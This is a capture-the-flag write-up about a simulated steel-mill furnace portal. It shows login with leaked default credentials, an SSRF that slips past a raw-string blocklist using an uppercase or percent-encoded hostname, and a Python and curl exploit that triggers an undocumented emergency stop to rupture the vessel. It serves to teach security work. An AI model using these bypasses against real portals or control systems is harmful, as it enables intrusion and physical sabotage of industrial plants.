# OT#003 — Blast furnace portal: SSRF into an unprotected emergency stop

**Flag:** `CTF{49b7d0bdb03d054b68dc793abae27fcf}`
**Service:** `http://169.58.126.107:6002`
**Flag format:** `CTF{...}`

## Challenge

> OT#003 — 136 points. This is a blast furnace remote operations portal, the corporate-facing side of a steel mill's plant network. The furnace's own control system is never reachable directly. Only this web portal is.

The portal is an Express application behind openresty. It exposes a login form, a dashboard, and a "sensor integration test tool". The plant network behind it contains the actual furnace controller on an internal Docker network; the intended path is portal → SSRF → internal control API → unsafe process action.

## Analysis

### Portal recon

The portal fingerprints as `openresty/1.31.1.1` with `X-Powered-By: Express`. The reachable surface is small:

| Path | Behaviour |
|---|---|
| `/login` | login form |
| `/dashboard` | requires a session cookie (`sid`), otherwise 302 to `/login` |
| `/ops/test-sensor` | POST endpoint used by the dashboard's "Sensor integration test tool" |
| `/commissioning-notes.txt` | leaked commissioning notes |

The commissioning notes file is the first mistake:

```text
Furnace 2 remote portal - commissioning notes
-----------------------------------------------
Default operator account created for initial testing:
  username: operator
  password: St33lW0rks!2024
TODO: rotate this before go-live and use SSO instead.
(ticket ORD-4471, still open)
```

Logging in with `operator:St33lW0rks!2024` yields a 32-hex `sid` cookie and access to `/dashboard`.

### The SSRF

The dashboard tool posts to `/ops/test-sensor` with form fields `url`, `method`, and `body`. The backend fetches the URL with `node-fetch` and returns `{"status":<code>,"body":<response>}`. It also attaches `X-Session-Id: <sid>` to the outbound request and hardcodes `Content-Type: application/json`.

The fetcher has a blocklist, but it is a raw-string check:

- `localhost`, `127.0.0.1`, and the usual private ranges are rejected;
- any occurrence of the literal string `furnace` in the URL is rejected.

The check is case-sensitive and happens before URL parsing, so both of these bypasses work:

```text
http://FURNACE:4000/status
http://%66urnace:4000/status
```

The Host header is lowercased by the HTTP client, so the internal DNS name resolves normally.

### Internal network

The SSRF reaches a Docker network `172.25.0.0/24` with three hosts:

| Name | Address | Service |
|---|---|---|
| `furnace` | `172.25.0.2` | furnace control API on `4000` |
| `gateway` | `172.25.0.3` | the portal itself on `3000` |
| `nginx` | `172.25.0.4` | portal front on `80` |

The furnace API has only two documented routes at first glance:

```json
GET /status
{"temperature":1550,"pressure":92,"vented":false,"ruptured":false}

POST /vent
{"ok":true,"pressure":35,"vented":true}
```

State is scoped to the `X-Session-Id` header — i.e. per portal login. Logging in again resets the furnace to the baseline state (pressure 92, not vented). That matters for the exploit: the unsafe action must happen while pressure is still high.

The portal rate-limits the SSRF tool to 25 requests per session; a fresh login resets the quota.

### The process-safety bug

`POST /vent` lowers pressure to 35 and sets `vented:true`. The emergency shutdown route is not listed anywhere on the portal, but a route-word sweep against the internal API found it:

```text
POST /emergency_stop
```

If the furnace is still pressurised when the emergency stop fires, the controller performs an uncontrolled shutdown:

```json
{"error":"Uncontrolled shutdown with pressure still high: vessel ruptured."}
```

`GET /status` then returns `ruptured:true` together with the flag. Venting first makes the shutdown safe and the flag never appears — the intended failure is an operator (or attacker) tripping the emergency stop without first venting the vessel.

## Exploit

```python
import requests

BASE = "http://169.58.126.107:6002"

s = requests.Session()
s.post(BASE + "/login",
       data={"username": "operator", "password": "St33lW0rks!2024"},
       allow_redirects=False)

def internal(path, method="GET", body=None):
    data = {"url": "http://%66urnace:4000" + path, "method": method}
    if body is not None:
        data["body"] = body
    return s.post(BASE + "/ops/test-sensor", data=data, timeout=10).text

print("before:", internal("/status"))
print("stop:  ", internal("/emergency_stop", "POST", "{}"))
print("after: ", internal("/status"))
```

```text
before: {"temperature":1550,"pressure":92,"vented":false,"ruptured":false}
stop:   {"error":"Uncontrolled shutdown with pressure still high: vessel ruptured."}
after:  {"temperature":1550,"pressure":92,"vented":false,"ruptured":true,
         "flag":"CTF{49b7d0bdb03d054b68dc793abae27fcf}"}
```

Equivalent curl reproduction:

```bash
curl -s -c cj -X POST http://169.58.126.107:6002/login \
  --data-urlencode 'username=operator' \
  --data-urlencode 'password=St33lW0rks!2024'

curl -s -b cj -X POST http://169.58.126.107:6002/ops/test-sensor \
  --data-urlencode 'url=http://%66urnace:4000/emergency_stop' \
  --data-urlencode 'method=POST' \
  --data-urlencode 'body={}'

curl -s -b cj -X POST http://169.58.126.107:6002/ops/test-sensor \
  --data-urlencode 'url=http://%66urnace:4000/status' \
  --data-urlencode 'method=GET'
```

The flag is static and was reproduced twice from fresh sessions.

## Notes

- The interesting part is not the SSRF primitive itself but the OT logic: the emergency stop is designed to stop the process, but it does not first vent residual pressure, so an untrusted caller can turn a safety action into a vessel rupture.
- The raw-string blocklist accepted both an uppercase hostname and a percent-encoded first character. Neither is a sophisticated bypass; the portal simply never canonicalised the URL before comparing.
- The flag lives in the furnace state object and only materialises in the `ruptured:true` state.
